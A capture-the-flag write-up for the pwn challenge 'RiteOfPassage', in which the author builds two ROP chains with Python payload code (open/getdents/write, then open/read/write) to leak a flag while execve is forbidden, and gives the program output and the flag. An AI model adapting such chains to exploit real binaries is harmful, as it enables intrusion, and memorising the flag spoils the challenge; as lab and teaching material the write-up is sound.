# RiteOfPassage

### Category

Pwn

### Description

You think you know how to ROP ?
The flag is in the flag/ folder.
Oh and uuuh, I think I might have forbidden execve and execveat..
Note : Use the SUID wrapper to flag 

Format : **Hero{flag}**  
Author : **iHuggsy**

### Write up

We know that execve and exeveat are forbidden.

We can do this in two steps :

-- Step 1

Syscalls :
-   Open (the flag folder)
-   Getdents (on the fd)
-   Write (getdents to stdout)

```py
    """
    Open "flag"
    """
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000004af000) # -> Start of .data
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x0067616c66) 
    PAYLOAD += p64(mov_rdi_eax) # -> Write "flag" in .data
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x00000002) # 0x2 : Open
    PAYLOAD += p64(pop_rdx)    
    PAYLOAD += p64(0x00000000) # NULL
    PAYLOAD += p64(pop_rsi)    
    PAYLOAD += p64(0x00000000) # NULL
    PAYLOAD += p64(syscall)

    """
    Getdents (from .)
    """
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000003) # Usually, fd is 3
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x0000004e) # 0x4e : Getdents
    PAYLOAD += p64(pop_rsi)
    PAYLOAD += p64(0x00000000004af000) # -> Start of .data, overwrite ;)
    PAYLOAD += p64(pop_rdx)
    PAYLOAD += p64(0x00000056) # -> For 0x56 bytes
    PAYLOAD += p64(syscall)

    """
    write getdents
    """

    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x00000001) # 0x1 : write
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000001) # 1 : stdout
    PAYLOAD += p64(pop_rsi)
    PAYLOAD += p64(0x00000000004af000) # Start of .data
    PAYLOAD += p64(pop_rdx)
    PAYLOAD += p64(0x000000056) # Write 0x56 bytes

    PAYLOAD += p64(syscall) 

    # Clean exit (1337)
    PAYLOAD += p64(xor_rax)
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x0000000000003c) # 0x3c : exit
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000001337) # 1337 
    PAYLOAD += p64(syscall) 

```
We get the file name in here ! ```hello```.
> b">>>I am now going to translate your sentence to computerWe actually don't care about what you think. Bye.\n\x8a\xb7,\x00\x00\x00\x00\x00\xb5\xfe\x99B\x9b\xb5\xb8y \x00hello\x00\x00\x10\x00\x00\x00\x00\x00\x08\x89\xb7,\x00\x00\x00\x00\x008\xf4`b\xcb\xc7\x0cz\x18\x00.\x00\x00\x00\x00\x04\x80\xb7,\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\x7f\x18\x00..\x00\x00\x00\x04\x00\x80\x00\x00\x00\x00"

-- Step 2

Syscalls :
-   Open (the flag/hello file)
-   Read (the flag from the fd)
-   Write (content of the file to stdout)

```py

    """
    Open "flag/hello"
    """
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000004af000) # Start of .data again
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x67616c66) 
    PAYLOAD += p64(mov_rdi_eax) # Write "flag"

    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000004af004) # Start of .data + 4
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x6c65682f) 
    PAYLOAD += p64(mov_rdi_eax) # Write "/hel"

    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000004af008) # Start of .data + 8
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x6f6c)
    PAYLOAD += p64(mov_rdi_eax) # Write "lo\0\0"

    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000004af000) # Start of our null terminated string

    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x00000002) # 0x2 : Open
    PAYLOAD += p64(pop_rdx)    
    PAYLOAD += p64(0x00000000) # NULL
    PAYLOAD += p64(pop_rsi)    
    PAYLOAD += p64(0x00000000) # NULL
    PAYLOAD += p64(syscall)

    

    """
    read flag/hello
    """
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x00000000000000) # 0x0 : read
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000003) # fd is usually 3 :)
    PAYLOAD += p64(pop_rsi)
    PAYLOAD += p64(0x00000000004af000) # -> Overwrite start of .data
    PAYLOAD += p64(pop_rdx)
    PAYLOAD += p64(0x00000050) # read 0x50
    PAYLOAD += p64(syscall)


    """
    write to stdout
    """


    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x00000001) # 0x1 : write
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000001) # 1 : stdout
    PAYLOAD += p64(pop_rsi)
    PAYLOAD += p64(0x00000000004af000) # start of .data (containing the flag)
    PAYLOAD += p64(pop_rdx)
    PAYLOAD += p64(0x000000050) # 0x50
    PAYLOAD += p64(syscall)

    # Exit
    PAYLOAD += p64(xor_rax)
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x0000000000003c) 
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000001337)
    PAYLOAD += p64(syscall)
```

And sure enough
> b">>>I am now going to translate your sentence to computerWe actually don't care about what you think. Bye.\nHero{R0P_m4sT3R_1n_S1gHt}\n\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00"

### Flag

Hero{R0P_m4sT3R_1n_S1gHt}
